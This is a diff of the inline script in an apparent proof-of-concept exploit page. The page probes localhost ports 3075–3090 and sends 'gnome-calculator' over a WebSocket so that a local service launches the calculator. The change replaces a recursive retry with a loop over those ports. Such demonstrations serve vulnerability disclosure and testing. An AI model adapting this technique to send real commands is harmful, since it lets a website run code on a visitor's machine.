@@ -49,16 +49,12 @@
                         // Ubuntu Desktop
                         ws.send('gnome-calculator\r\n');
                     };
-                },
-                error: function (result) {
-                    exec_cmd(port + 1);
-                    if (port > 3090) {
-                        return false;
-                    }
                 }
             });
         }
-        exec_cmd(3075);
+        for (var i = 3075; i <= 3090; i++) {
+            exec_cmd(i);
+        }
     </script>
 
 </body>
